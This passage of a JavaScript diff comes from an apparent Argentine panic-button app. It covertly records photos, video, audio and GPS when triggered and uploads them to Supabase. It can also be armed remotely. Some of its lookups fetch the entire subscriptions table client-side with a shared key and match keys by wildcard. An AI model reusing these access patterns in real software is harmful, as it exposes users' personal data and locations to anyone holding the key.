+                <div class="mono" style="margin-top:10px;font-size:10px;">SHA-256 ORIGINAL: ${item.hash_integridad}</div>
+            </div>`;
+        }).join('');
+    } catch (e) {}
+}
+
+async function disparoSOS(origen = 'manual'){
+    if(window.sosActivo || window.bloqueoDisparo) { 
+        debugLog('Freno activo: El sistema ya está grabando evidencia. Ignorando doble toque.');
+        return; 
+    } 
+    window.bloqueoDisparo = true;
+    window.sosActivo = true;
+    
+    voiceActive = false;
+    if (micStreamSigilo) micStreamSigilo.getTracks().forEach(t=>t.stop());
+    if (audioCtxActivo) audioCtxActivo.close();
+    
+    window.origenSOS = origen;
+    document.getElementById('btnBigSOS').innerText = 'DETENER S.O.S';
+    document.getElementById('btnBigSOS').classList.add('activo');
+    document.getElementById('st').style.display = 'block';
+    debugLog('=== S.O.S. DISPARADO POR: ' + origen + ' ===');
+    
+    if ("vibrate" in navigator) { try { navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 2000]); } catch(e){} }
+    try { if ('speechSynthesis' in window) speechSynthesis.cancel(); } catch(e){}
+    
+    const imei = localStorage.getItem('imei') || 'SIN_IMEI';
+    const nombre = localStorage.getItem('nombre') || 'Usuaria';
+    let contactos = [];
+    try {
+        let raw = localStorage.getItem('contactos') || localStorage.getItem('contactos_' + imei) || '[]';
+        contactos = JSON.parse(raw);
+    } catch(e) { contactos = []; }
+    
+    const emailDestino = localStorage.getItem('contacto_email') || localStorage.getItem('contacto_email_' + imei) || '';
+    const id = 'P4-' + Date.now() + '-' + Math.random().toString(16).slice(2,8).toUpperCase();
+    aid = id;
+    
+    let acta = {
+        id: id, imei: imei, nombre: nombre, lat: 'Buscando...', lng: 'Buscando...', precision: 0, 
+        hora: new Date().toLocaleTimeString('es-AR', {hour12: false}), 
+        fecha: new Date().toLocaleDateString('es-AR'),
+        sello_ms: Date.now(), audios: [], imagenes: [], videos: [], sensores: [], 
+        sello_inicio: new Date().toISOString(), sha256: 'Calculando...', 
+        hash_judicial: 'Calculando...', eventos: [], numero_acta: id, ruta: [],
+        bateria: 'Desc.', cargando: 'Desc.', red: 'Desc.', signal: 'No disponible',
+        userAgent: navigator.userAgent, pantalla: screen.width + 'x' + screen.height
+    };
+    listaActas.push(acta);
+    
+    let currentImei = localStorage.getItem('imei');
+    if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') {
+        const c = document.getElementById('alertas');
+        if(c && c.innerHTML.includes('calma')) c.innerHTML = '';
+        render(acta); 
+    }
+    
+    if (origen !== 'remoto') {
+        enviarSMSOculto(contactos, nombre, null, null, id, 'alerta');
+    }
+    enviarEmailOculto(emailDestino, nombre, null, null, id, 'alerta');
+    
+    loopEvidencia(acta); 
+    loopAudioContinuo(acta);
+    
+    if (imei && imei !== 'SIN_IMEI') {
+        authTrucha(imei).then(ok => {
+            if(ok) supaQuery('POST', 'c4_emergencias', { 
+                imei: imei, codigo_sos: id, fecha_activacion: new Date().toISOString() 
+            }).catch(e => debugLog('supa emergencia error: ' + e.message));
+        });
+    }
+    
+    try {
+        if(navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                if(!listaActas.find(a => a.id === acta.id)) return;
+                acta.bateria = Math.round(b.level * 100) + '%';
+                acta.cargando = b.charging ? 'Sí' : 'No';
+                guardarActas();
+                sincronizarActaEnNube(acta);
+                if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+            });
+        }
+    } catch(e){}
+    
+    try { 
+        if(navigator.connection) {
+            acta.red = navigator.connection.effectiveType || 'Desc.'; 
+            acta.signal = 'Vel. Bajada: ' + (navigator.connection.downlink||0) + 'Mbps | RTT: ' + (navigator.connection.rtt||0) + 'ms';
+            guardarActas();
+            sincronizarActaEnNube(acta);
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+        }
+    } catch(e){}
+    
+    sha256(id+imei+Date.now()).then(hash => {
+        if(!listaActas.find(a => a.id === acta.id)) return;
+        acta.sha256 = hash; acta.hash_judicial = hash;
+        guardarActas();
+        sincronizarActaEnNube(acta);
+        if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+    }).catch(()=>{});
+    
+    guardarActas();
+    sincronizarActaEnNube(acta);
+    
+    let esPrimerGPS = true;
+    if (navigator.geolocation) {
+        gps = navigator.geolocation.watchPosition(p => {
+            if(!listaActas.find(a => a.id === acta.id)) { navigator.geolocation.clearWatch(gps); return; }
+            acta.lat = p.coords.latitude; acta.lng = p.coords.longitude;
+            acta.precision = Math.round(p.coords.accuracy);
+            if (!acta.ruta) acta.ruta = [];
+            acta.ruta.push([acta.lat, acta.lng]);
+            guardarActas();
+            sincronizarActaEnNube(acta);
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta); 
+            if (esPrimerGPS) {
+                esPrimerGPS = false;
+                if (window.origenSOS !== 'remoto') {
+                    enviarSMSOculto(contactos, nombre, acta.lat, acta.lng, id, 'alerta_gps');
+                }
+                enviarEmailOculto(emailDestino, nombre, acta.lat, acta.lng, id, 'gps');
+            }
+        }, () => { 
+            if(esPrimerGPS) {
+                esPrimerGPS = false;
+                acta.lat = 'Desconocida'; acta.lng = 'Desconocida (Señal bloqueada)';
+                guardarActas();
+                sincronizarActaEnNube(acta);
+                if (window.origenSOS !== 'remoto') {
+                    enviarSMSOculto(contactos, nombre, 'Desconocida', 'Desconocida', id, 'alerta_sin_gps');
+                }
+                enviarEmailOculto(emailDestino, nombre, 'Desconocida', 'Desconocida', id, 'gps');
+            }
+        }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+    }
+}
+
+async function guardarNuevoAudio(acta, audio) {
+    if(!listaActas.find(a => a.id === acta.id)) return;
+    if(!acta.audios) acta.audios = [];
+    if (audio instanceof Blob && audio.size > 0) {
+        const mime = audio.type || 'audio/webm';
+        const ext = mime.includes('mp4') ? 'mp4' : (mime.includes('ogg') ? 'ogg' : 'webm');
+        const urlRemota = await subirArchivoBucket(audio, acta.id, 'audio', ext, mime);
+        acta.audios.push({url: urlRemota, blob: audio});
+    } else if (audio) {
+        acta.audios.push(audio);
+    }
+    await guardarActas();
+    sincronizarActaEnNube(acta);
+    let currentImei = localStorage.getItem('imei');
+    if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+}
+
+async function loopAudioContinuo(acta) {
+    if(!window.sosActivo || !acta) return;
+    if(!listaActas.find(a => a.id === acta.id)) return;
+    if(Date.now() - (acta.sello_ms || Date.now()) > EXPIRACION_ACTA_MS) return;
+
+    try {
+        const clipAudio = await capturarAudio(15000);
+        if (window.sosActivo && listaActas.find(a => a.id === acta.id)) {
+            await guardarNuevoAudio(acta, clipAudio);
+        }
+    } catch(e) {}
+
+    if(window.sosActivo && listaActas.find(a => a.id === acta.id)) {
+        setTimeout(() => loopAudioContinuo(acta), 400);
+    }
+}
+
+async function loopEvidencia(acta) {
+    if(!window.sosActivo || !acta) return;
+    if(!listaActas.find(a => a.id === acta.id)) return;
+    
+    if(Date.now() - (acta.sello_ms || Date.now()) > EXPIRACION_ACTA_MS) { 
+        window.sosActivo = false; parar(); 
+        let btn = document.getElementById('btnBigSOS');
+        if(btn) { btn.innerText = 'S.O.S'; btn.classList.remove('activo'); }
+        await limpiarArchivosBucketActa(acta);
+        await purgarActaVencidaEnSupabase(acta.imei, localStorage.getItem('llave_maestra'));
+        alert("Cierre de seguridad automático corporativo: 24 horas transcurridas.");
+        return; 
+    }
+    
+    debugLog('Ciclo ráfaga HD 15s hacia Supabase Bucket...');
+    
+    try {
+        const fotoFrontal = await capturarFoto('front');
+        if(listaActas.find(a => a.id === acta.id)) {
+            if(!acta.imagenes) acta.imagenes = [];
+            const urlFotoF = await subirArchivoBucket(fotoFrontal, acta.id, 'foto_frontal', 'jpg', 'image/jpeg');
+            acta.imagenes.push({url: urlFotoF, camara: 'frontal', sha256: 'HASH-'+Date.now()});
+            await guardarActas();
+            sincronizarActaEnNube(acta);
+            let currentImei = localStorage.getItem('imei');
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+        }
+    } catch(e) {}
+    
+    if(!window.sosActivo || !listaActas.find(a => a.id === acta.id)) return;
+    
+    try {
+        const fotoTrasera = await capturarFoto('back');
+        if(listaActas.find(a => a.id === acta.id)) {
+            if(!acta.imagenes) acta.imagenes = [];
+            const urlFotoT = await subirArchivoBucket(fotoTrasera, acta.id, 'foto_trasera', 'jpg', 'image/jpeg');
+            acta.imagenes.push({url: urlFotoT, camara: 'trasera', sha256: 'HASH-'+Date.now()});
+            await guardarActas();
+            sincronizarActaEnNube(acta);
+            let currentImei = localStorage.getItem('imei');
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+        }
+    } catch(e) {}
+    
+    if(!window.sosActivo || !listaActas.find(a => a.id === acta.id)) return;
+    
+    try {
+        const videoTrasero = await capturarVideo(15000, 'environment');
+        if(listaActas.find(a => a.id === acta.id)) {
+            if(!acta.videos) acta.videos = [];
+            if (videoTrasero instanceof Blob && videoTrasero.size > 0) {
+                const mimeV = videoTrasero.type || 'video/webm';
+                const extV = mimeV.includes('mp4') ? 'mp4' : 'webm';
+                const urlVidT = await subirArchivoBucket(videoTrasero, acta.id, 'video_trasera', extV, mimeV);
+                acta.videos.push({url: urlVidT, blob: videoTrasero, camara: 'TRASERA'});
+            } else if (videoTrasero && videoTrasero.rutaNativa) {
+                acta.videos.push({rutaNativa: videoTrasero.rutaNativa, camara: 'TRASERA'});
+            }
+            await guardarActas();
+            sincronizarActaEnNube(acta);
+            let currentImei = localStorage.getItem('imei');
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+        }
+    } catch(e) {}
+
+    if(!window.sosActivo || !listaActas.find(a => a.id === acta.id)) return;
+
+    try {
+        const fotoFrontal2 = await capturarFoto('front');
+        if(listaActas.find(a => a.id === acta.id)) {
+            if(!acta.imagenes) acta.imagenes = [];
+            const urlFotoF2 = await subirArchivoBucket(fotoFrontal2, acta.id, 'foto_frontal', 'jpg', 'image/jpeg');
+            acta.imagenes.push({url: urlFotoF2, camara: 'frontal', sha256: 'HASH-'+Date.now()});
+            await guardarActas();
+            sincronizarActaEnNube(acta);
+            let currentImei = localStorage.getItem('imei');
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+        }
+    } catch(e) {}
+
+    if(!window.sosActivo || !listaActas.find(a => a.id === acta.id)) return;
+
+    try {
+        const fotoTrasera2 = await capturarFoto('back');
+        if(listaActas.find(a => a.id === acta.id)) {
+            if(!acta.imagenes) acta.imagenes = [];
+            const urlFotoT2 = await subirArchivoBucket(fotoTrasera2, acta.id, 'foto_trasera', 'jpg', 'image/jpeg');
+            acta.imagenes.push({url: urlFotoT2, camara: 'trasera', sha256: 'HASH-'+Date.now()});
+            await guardarActas();
+            sincronizarActaEnNube(acta);
+            let currentImei = localStorage.getItem('imei');
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+        }
+    } catch(e) {}
+
+    if(!window.sosActivo || !listaActas.find(a => a.id === acta.id)) return;
+
+    try {
+        const videoFrontal = await capturarVideo(15000, 'user');
+        if(listaActas.find(a => a.id === acta.id)) {
+            if(!acta.videos) acta.videos = [];
+            if (videoFrontal instanceof Blob && videoFrontal.size > 0) {
+                const mimeVF = videoFrontal.type || 'video/webm';
+                const extVF = mimeVF.includes('mp4') ? 'mp4' : 'webm';
+                const urlVidF = await subirArchivoBucket(videoFrontal, acta.id, 'video_frontal', extVF, mimeVF);
+                acta.videos.push({url: urlVidF, blob: videoFrontal, camara: 'FRONTAL'});
+            } else if (videoFrontal && videoFrontal.rutaNativa) {
+                acta.videos.push({rutaNativa: videoFrontal.rutaNativa, camara: 'FRONTAL'});
+            }
+            await guardarActas();
+            sincronizarActaEnNube(acta);
+            let currentImei = localStorage.getItem('imei');
+            if (acta.imei === currentImei || acta.imei === 'SIN_IMEI') render(acta);
+        }
+    } catch(e) {}
+    
+    if(window.sosActivo && listaActas.find(a => a.id === acta.id)) {
+        setTimeout(() => loopEvidencia(acta), 500);
+    }
+}
+
+function procesarAceleracion(x, y, z) {
+    gravedad[0] = FILTRO_GRAVEDAD * gravedad[0] + (1 - FILTRO_GRAVEDAD) * x;
+    gravedad[1] = FILTRO_GRAVEDAD * gravedad[1] + (1 - FILTRO_GRAVEDAD) * y;
+    gravedad[2] = FILTRO_GRAVEDAD * gravedad[2] + (1 - FILTRO_GRAVEDAD) * z;
+    const accX = x - gravedad[0];
+    const accY = y - gravedad[1];
+    const accZ = z - gravedad[2];
+    const fuerza = Math.sqrt(accX*accX + accY*accY + accZ*accZ) / 9.81;
+    if (fuerza > SHAKE_THRESHOLD && !cooldownRobo && localStorage.getItem('ok') === '1' && !window.sosActivo && document.getElementById('pantalla-sigilo')) {
+        debugLog('¡IMPACTO DETECTADO! Fuerza: ' + fuerza.toFixed(2) + 'G');
+        cooldownRobo = true;
+        setTimeout(() => { cooldownRobo = false; }, SHAKE_COOLDOWN);
+        activarAlarmaAutomatica('sacudon');
+        return true;
+    }
+    return false;
+}
+
+async function activarSensoresSacudon() {
+    if (sensoresActivos) return;
+    if (typeof window.DeviceMotionEvent !== 'undefined') {
+        window.addEventListener('devicemotion', (e) => {
+            const acc = e.accelerationIncludingGravity || e.acceleration;
+            if (acc && acc.x !== null) { 
+                sensoresActivos = true; 
+                procesarAceleracion(acc.x, acc.y, acc.z); 
+            }
+        }, true);
+        debugLog('Sensores de impacto activados');
+    }
+}
+
+async function activarSensoresVoz() {
+    if (voiceActive || window.sosActivo) return;
+    try {
+        micStreamSigilo = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } });
+        audioCtxActivo = new (window.AudioContext || window.webkitAudioContext)();
+        const source = audioCtxActivo.createMediaStreamSource(micStreamSigilo);
+        const analyser = audioCtxActivo.createAnalyser();
+        analyser.fftSize = 256;
+        source.connect(analyser);
+        const dataArray = new Uint8Array(analyser.frequencyBinCount);
+        
+        voiceActive = true;
+        debugLog('Sensor Acústico de Decibelios activado (0 Beeps)');
+        
+        function checkVolume() {
+            if(!voiceActive || window.sosActivo || !document.getElementById('pantalla-sigilo')) {
+                if (micStreamSigilo) micStreamSigilo.getTracks().forEach(t=>t.stop());
+                if (audioCtxActivo) audioCtxActivo.close();
+                voiceActive = false;
+                return;
+            }
+            
+            analyser.getByteFrequencyData(dataArray);
+            
+            let picoMaximo = 0;
+            let suma = 0;
+            
+            for(let i = 0; i < dataArray.length; i++) {
+                if(dataArray[i] > picoMaximo) picoMaximo = dataArray[i];
+                suma += dataArray[i];
+            }
+            
+            let promedio = suma / dataArray.length;
+            
+            if (picoMaximo >= 240 && promedio > 70 && !cooldownRobo) {
+                debugLog('¡GRITO DETECTADO! Pico: ' + picoMaximo + ' / Prom: ' + promedio);
+                activarAlarmaAutomatica('grito / ruido violento');
+                return;
+            }
+            
+            setTimeout(checkVolume, 100);
+        }
+        checkVolume();
+    } catch(e) {
+        debugLog('Error en sensor acústico: ' + e.message);
+    }
+}
+
+function activarAlarmaAutomatica(motivo) {
+    window.ir('sos');
+    if ("vibrate" in navigator) navigator.vibrate([500, 200, 500, 200, 1000]);
+    let parpadeos = 0;
+    let destello = setInterval(() => {
+        document.body.style.backgroundColor = (parpadeos % 2 === 0) ? '#B00020' : '#FFFFFF';
+        parpadeos++;
+        if (parpadeos > 8) { clearInterval(destello); document.body.style.backgroundColor = '#FFFFFF'; }
+    }, 150);
+    disparoSOS(motivo);
+}
+
+const parar = () => {
+    if(gps) navigator.geolocation.clearWatch(gps);
+    document.getElementById('st').style.display = 'none';
+    document.body.style.backgroundColor = '#FFFFFF';
+    window.bloqueoDisparo = false; 
+};
+
+window.confirmarParar = async function(){
+    const k = document.getElementById('lkStop').value;
+    if(!k) return;
+    const llaveLimpia = LK(k);
+    const llaveLocal = localStorage.getItem('llave_maestra');
+    let esValida = false;
+    let imeiDetectado = localStorage.getItem('imei');
+    
+    if(llaveLocal && llaveLimpia === LK(llaveLocal)) esValida = true;
+    if(!esValida) {
+        try {
+            const sub = await buscarSuscripcionPorLlave(llaveLimpia);
+            if(sub) {
+                esValida = true;
+                imeiDetectado = sub.imei;
+            }
+        } catch(e) {}
+    }
+    if(!esValida) { alert('LLAVE INCORRECTA.'); return; }
+    
+    if (window.stopTarget === 'centinela') {
+        clearInterval(centinelaInterval);
+        centinelaInterval = null;
+        localStorage.removeItem('centinelaEnd');
+        let cronoEl = document.getElementById('cronoDisplay');
+        if(cronoEl) cronoEl.style.display = 'none';
+        
+        let btn = document.getElementById('btnCentinela');
+        if(btn) { btn.innerText = 'ACTIVAR CENTINELA'; btn.classList.remove('rubi'); }
+        
+        document.getElementById('modalStop').style.display = 'none';
+        alert('Modo Centinela desactivado con éxito.');
+        return;
+    }
+
+    if(imeiDetectado) {
+        await authTrucha(imeiDetectado);
+        supaQuery('PATCH', 'c4_suscripciones?llave_acceso=eq.' + llaveLimpia, { alarma_remota: false }).catch(()=>{});
+    }
+    document.getElementById('modalStop').style.display = 'none';
+    alert('Código verificado. Desactivando alerta corporativa...');
+    parar(); 
+    window.sosActivo = false;
+    document.getElementById('btnBigSOS').innerText = 'S.O.S';
+    document.getElementById('btnBigSOS').classList.remove('activo');
+    const nombre = localStorage.getItem('nombre') || 'Usuaria';
+    const emailDestino = localStorage.getItem('contacto_email') || localStorage.getItem('contacto_email_' + imeiDetectado) || '';
+    
+    enviarEmailOculto(emailDestino, nombre, null, null, aid || 'EXP-CERRADO', 'seguro');
+    window.ir('inicio');
+};
+
+async function alta(){
+    const n = document.getElementById('rN').value.trim();
+    let i = IM(document.getElementById('rI').value);
+    const w = document.getElementById('rW').value.trim();
+    const c1 = document.getElementById('cF1').value.trim();
+    const cEmail = document.getElementById('cE1').value.trim();
+    const c = [c1].filter(Boolean); 
+    
+    if(!n || !w) return alert('Por favor, ingresá tu Nombre completo y tu número de celular.');
+    
+    let imeiPendiente = false;
+    if (!/^\d{15}$/.test(i)) {
+        let digitosTel = w.replace(/\D/g, '');
+        let relleno = (Date.now().toString() + '359988776655443');
+        i = ('35' + digitosTel + relleno).slice(0, 15);
+        imeiPendiente = true;
+    }
+    
+    try {
+        const authOk = await authTrucha(i);
+        if(!authOk) return; 
+        
+        const checkWA = await supaQuery('GET', 'c4_suscripciones?select=*&whatsapp=eq.' + w.replace(/\D/g, ''));
+        if(checkWA && checkWA.length > 0) {
+            alert('¡SISTEMA ANTI-PICARO ACTIVADO!\\nEste número de celular ya se encuentra registrado en el sistema C4.');
+            return;
+        }
+        const checkImei = await supaQuery('GET', 'c4_suscripciones?select=*&imei=eq.' + i);
+        if(checkImei && checkImei.length > 0) {
+            alert('SISTEMA CORPORATIVO:\\nEste equipo ya agotó los 15 días de prueba.');
+            document.getElementById('pI').value = i;
+            if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = i;
+            localStorage.setItem('imei', i);
+            window.ir('pago');
+            return;
+        }
+        
+        await solicitarTodosLosPermisos();
+        
+        const k = 'C4-' + Math.random().toString(16).slice(2,6).toUpperCase() + '-' + Math.random().toString(16).slice(2,6).toUpperCase();
+        let fechaVencimiento = new Date();
+        fechaVencimiento.setDate(fechaVencimiento.getDate() + 15);
+        const fechaIso = fechaVencimiento.toISOString();
+
+        await supaQuery('POST', 'c4_suscripciones', { 
+            email: i + '@c4judicial.com.ar', imei: i, whatsapp: w.replace(/\D/g, ''), llave_acceso: k, 
+            tipo_plan: 'prueba_15', fecha_vencimiento: fechaIso, 
+            activa: true, alarma_remota: false 
+        });
+
+        supaQuery('PATCH', 'c4_suscripciones?llave_acceso=eq.' + k, {
+            nombre: n,
+            contacto_wa: (c[0] || '').replace(/\D/g, ''),
+            contacto_email: cEmail,
+            contactos_json: JSON.stringify(c)
+        }).catch(()=>{});
+
+        localStorage.setItem('imei', i); 
+        localStorage.setItem('fecha_vencimiento', fechaIso);
+        if (imeiPendiente) localStorage.setItem('imei_pendiente', '1');
+        else localStorage.removeItem('imei_pendiente');
+
+        localStorage.setItem('nombre', n);
+        localStorage.setItem('mi_wa', w.replace(/\D/g, ''));
+        localStorage.setItem('contactos', JSON.stringify(c));
+        localStorage.setItem('contactos_' + i, JSON.stringify(c)); 
+        if(cEmail) {
+            localStorage.setItem('contacto_email', cEmail);
+            localStorage.setItem('contacto_email_' + i, cEmail);
+        }
+        document.getElementById('pI').value = i;
+        if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = i;
+        document.getElementById('lk').textContent = k;
+        
+        localStorage.setItem('ok','1');
+        localStorage.setItem('llave_maestra', k); 
+        
+        enviarEmailOculto(cEmail, n, null, null, k, 'bienvenida');
+        
+        activarBotonesSeguridad();
+        await verificarSuscripcion();
+        window.ir('llave');
+        
+    } catch(err) { 
+        debugLog('Alta error: ' + err.message);
+        alert('Error conectando a la red C4. Verificá tu conexión a internet.'); 
+    }
+}
+
+async function procesarPagoIA() {
+    const fileInput = document.getElementById('comprobante');
+    if (!fileInput.files.length) return alert('Por favor, subí el comprobante de pago.');
+    const i = IM(document.getElementById('pI').value || localStorage.getItem('imei'));
+    if(!/^\d{15}$/.test(i)) return alert('ID / IMEI inválido.');
+    
+    alert('Nuestra inteligencia artificial está auditando tu comprobante en el servidor central...');
+    const file = fileInput.files[0];
+    const reader = new FileReader();
+    
+    reader.onload = async function(e) {
+        const base64Img = e.target.result;
+        
+        try {
+            const res = await fetch('/api/verificar-pago', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ local: true, fotoBase64: base64Img })
+            });
+            
+            const data = await res.json();
+            
+            if (!data.success) {
+                return alert('ERROR EN AUDITORÍA:\\n' + data.msg);
+            }
+            
+            let mesesSumar = 1;
+            
+            const authOk = await authTrucha(i);
+            if(!authOk) return alert('Error de conexión a la bóveda C4.');
+
+            let llaveExistente = null;
+            let fechaActual = new Date();
+            
+            const check = await supaQuery('GET', 'c4_suscripciones?imei=eq.' + i);
+            if (check && check.length > 0) {
+                llaveExistente = check[0].llave_acceso;
+                if (check[0].fecha_vencimiento) {
+                   let venciDB = new Date(check[0].fecha_vencimiento);
+                   if (venciDB > fechaActual) fechaActual = venciDB; 
+                }
+            }
+
+            fechaActual.setMonth(fechaActual.getMonth() + mesesSumar);
+            const fechaIso = fechaActual.toISOString();
+            const k = llaveExistente || ('C4-' + Math.random().toString(16).slice(2,6).toUpperCase() + '-' + Math.random().toString(16).slice(2,6).toUpperCase());
+
+            if (check && check.length > 0) {
+                await supaQuery('PATCH', 'c4_suscripciones?imei=eq.' + i, { 
+                    tipo_plan: 'mensual', 
+                    fecha_vencimiento: fechaIso, 
+                    activa: true 
+                });
+            } else {
+                await supaQuery('POST', 'c4_suscripciones', { 
+                    email: i + '@c4judicial.com.ar', imei: i, llave_acceso: k, 
+                    tipo_plan: 'mensual', fecha_vencimiento: fechaIso, 
+                    activa: true, alarma_remota: false 
+                });
+            }
+
+            supaQuery('PATCH', 'c4_suscripciones?llave_acceso=eq.' + k, {
+                nombre: localStorage.getItem('nombre') || '',
+                contacto_email: localStorage.getItem('contacto_email') || '',
+                contactos_json: localStorage.getItem('contactos') || '[]'
+            }).catch(()=>{});
+
+            document.getElementById('lk').textContent = k;
+            localStorage.setItem('llave_maestra', k);
+            localStorage.setItem('fecha_vencimiento', fechaIso);
+            localStorage.setItem('ok', '1');
+            localStorage.setItem('imei', i);
+            
+            activarBotonesSeguridad();
+            await verificarSuscripcion();
+            await solicitarTodosLosPermisos();
+            
+            alert(data.msg + '\\nTu servicio judicial ha sido reactivado exitosamente. Tu Llave Maestra sigue siendo exactamente la misma.');
+            window.ir('llave');
+
+        } catch(errReq) {
+            debugLog('Error Vercel IA: ' + errReq.message);
+            alert('Error conectando con la Inteligencia Artificial C4. Intentá de nuevo.');
+        }
+    };
+    reader.readAsDataURL(file);
+}
+
+async function buscarSuscripcionPorLlave(llaveInput) {
+    const l = LK(llaveInput).trim();
+    if (!l) return null;
+    const ultimos4 = l.replace(/[^A-Z0-9]/g, '').slice(-4);
+    const headers = { 'apikey': SUPA_KEY, 'Authorization': 'Bearer ' + SUPA_KEY };
+    const intentosDirectos = [
+        'c4_suscripciones?select=*&llave_acceso=eq.' + encodeURIComponent(l),
+        'c4_suscripciones?select=*&llave_acceso=ilike.' + encodeURIComponent(l),
+        'c4_suscripciones?select=*&llave_acceso=ilike.*' + encodeURIComponent(ultimos4)
+    ];
+    for (const ep of intentosDirectos) {
+        try {
+            const res = await fetch(SUPA_URL + '/rest/v1/' + ep, { headers: headers });
+            if (res.ok) {
+                const data = await res.json();
+                if (Array.isArray(data)) {
+                    const match = data.find(function(row){ return row && LK(row.llave_acceso) === l; });
+                    if (match) return match;
+                }
+            }
+        } catch(e) { debugLog('buscarSuscripcionPorLlave (directo): ' + e.message); }
+    }
+    try {
+        await asegurarSesionSupabase();
+        for (const modo of ['eq','ilike']) {
+            try {
+                const data = await supaQuery('GET', 'c4_suscripciones?select=*&llave_acceso=' + modo + '.' + encodeURIComponent(l));
+                if (Array.isArray(data)) {
+                    const match = data.find(function(row){ return row && LK(row.llave_acceso) === l; });
+                    if (match) return match;
+                }
+            } catch(e) {}
+        }
+        try {
+            const todo = await supaQuery('GET', 'c4_suscripciones?select=*');
+            if (Array.isArray(todo)) {
+                const match = todo.find(function(row){ return row && LK(row.llave_acceso) === l; });
+                if (match) return match;
+            }
+        } catch(e) {}
+    } catch(e) { debugLog('buscarSuscripcionPorLlave (sesion): ' + e.message); }
+    return null;
+}
+
+function restaurarDatosRecuperacion(sub) {
+    if (!sub) return;
+    try {
+        if (sub.nombre) localStorage.setItem('nombre', sub.nombre);
+        if (sub.whatsapp) localStorage.setItem('mi_wa', String(sub.whatsapp));
+        if (sub.contacto_email) {
+            localStorage.setItem('contacto_email', sub.contacto_email);
+            if (sub.imei) localStorage.setItem('contacto_email_' + sub.imei, sub.contacto_email);
+        }
+        if (sub.contactos_json) {
+            const arr = JSON.parse(sub.contactos_json);
+            if (Array.isArray(arr) && arr.length) {
+                const str = JSON.stringify(arr);
+                localStorage.setItem('contactos', str);
+                if (sub.imei) localStorage.setItem('contactos_' + sub.imei, str);
+            }
+        }
+        if (sub.tipo_plan) localStorage.setItem('tipo_plan', sub.tipo_plan);
+    } catch(e) { debugLog('restaurarDatosRecuperacion: ' + e.message); }
+}
+
+async function validar(){
+    const k = LK(document.getElementById('lkI').value);
+    if(!k) return alert('Por favor, ingresá tu Llave Maestra C4.');
+    await cargarActasLocales(); 
+    try {
+        const sub = await buscarSuscripcionPorLlave(k);
+        if(!sub) {
+            const llaveLocal = localStorage.getItem('llave_maestra');
+            if (llaveLocal && k === LK(llaveLocal)) {
+                localStorage.setItem('ok', '1');
+                activarBotonesSeguridad();
+                await verificarSuscripcion();
+                await solicitarTodosLosPermisos();
+                window.ir('panel');
+                return;
+            }
+            return alert('Llave Maestra no encontrada en la bóveda C4.');
+        }
+        await authTrucha(sub.imei);
+        restaurarDatosRecuperacion(sub);
+        if(new Date() > new Date(sub.fecha_vencimiento)) {
+            await supaQuery('PATCH', 'c4_suscripciones?id=eq.' + sub.id, { activa: false }).catch(()=>{});
+            alert('TU LLAVE SE ENCUENTRA VENCIDA.');
+            document.getElementById('pI').value = sub.imei;
+            if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = sub.imei;
+            window.ir('pago');
+        } else {
+            sessionStorage.setItem('k', k);
+            localStorage.setItem('imei', sub.imei);
+            localStorage.setItem('llave_maestra', sub.llave_acceso); 
+            localStorage.setItem('fecha_vencimiento', sub.fecha_vencimiento);
+            localStorage.setItem('ok', '1');
+            document.getElementById('pI').value = sub.imei;
+            if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = sub.imei;
+            
+            if (sub.datos_acta) {
+                try {
+                    const actaNube = JSON.parse(sub.datos_acta);
+                    if (actaNube && actaNube.sello_ms && (Date.now() - actaNube.sello_ms > EXPIRACION_ACTA_MS)) {
+                        await limpiarArchivosBucketActa(actaNube);
+                        await purgarActaVencidaEnSupabase(sub.imei, sub.llave_acceso);
+                    } else if (actaNube && actaNube.id) {
+                        const idxExistente = listaActas.findIndex(x => x.id === actaNube.id);
+                        if (idxExistente >= 0) listaActas[idxExistente] = actaNube;
+                        else listaActas.push(actaNube);
+                    }
+                } catch(eActa) {}
+            }
+
+            listaActas.forEach(a => { if(a.imei === 'SIN_IMEI') a.imei = sub.imei; });
+            await guardarActas();
+            let cRespaldo = localStorage.getItem('contactos_' + sub.imei) || localStorage.getItem('contactos');
+            if (cRespaldo) localStorage.setItem('contactos', cRespaldo);
+            activarBotonesSeguridad();
+            await verificarSuscripcion();
+            await solicitarTodosLosPermisos();
+            window.ir('panel');
+        }
+    } catch(e) { alert('Error validando la Llave Maestra en el servidor C4.'); }
+}
+
+async function recuperar(accion) {
+    const l = LK(document.getElementById('rrL').value).trim();
+    if(!l || l.length < 6) return alert('Por favor, ingresá tu Llave Maestra C4.');
+    
+    const llaveLocal = localStorage.getItem('llave_maestra');
+    const imeiLocal = localStorage.getItem('imei');
+
+    if (llaveLocal && l === LK(llaveLocal) && imeiLocal) {
+        if (accion === 'restaurar') {
+            localStorage.setItem('ok', '1');
+            activarBotonesSeguridad();
+            await verificarSuscripcion();
+            await solicitarTodosLosPermisos();
+            alert('✅ Llave Criptográfica verificada con éxito.\nTu Botón Antipánico S.O.S. y el Temporizador Centinela ya están nuevamente activos.');
+            window.ir('inicio');
+            return;
+        }
+        if (accion === 'detonar') {
+            try {
+                await asegurarSesionSupabase();
+                await supaQuery('PATCH', 'c4_suscripciones?imei=eq.' + imeiLocal, { alarma_remota: true }).catch(()=>{});
+            } catch(e) {}
